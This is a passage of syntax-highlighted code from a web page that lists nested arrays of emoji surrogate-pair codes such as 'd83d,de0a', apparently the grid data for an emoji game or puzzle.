class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        